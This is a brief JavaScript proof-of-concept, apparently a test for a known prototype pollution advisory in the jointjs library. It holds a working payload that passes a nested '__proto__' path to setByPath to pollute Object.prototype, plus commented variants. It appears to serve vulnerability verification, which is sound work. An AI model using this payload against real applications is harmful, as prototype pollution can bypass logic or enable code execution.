// //https://security.snyk.io/vuln/SNYK-JS-JOINTJS-1579578
// test("prototype pollution in jointjs", () => {
console.log({}.polluted);

  const jointjs = require("jointjs");
  jointjs.util.setByPath({}, [["__proto__"], "polluted"], "yes");

console.log({}.polluted);
//});

// jointjs.util.setByPath({}, 'proto/polluted', 'yes');
// jointjs.util.setByPath({}, ['proto', 'polluted'], 'yes');
// // console.log(polluted); // ReferenceError: polluted is not defined
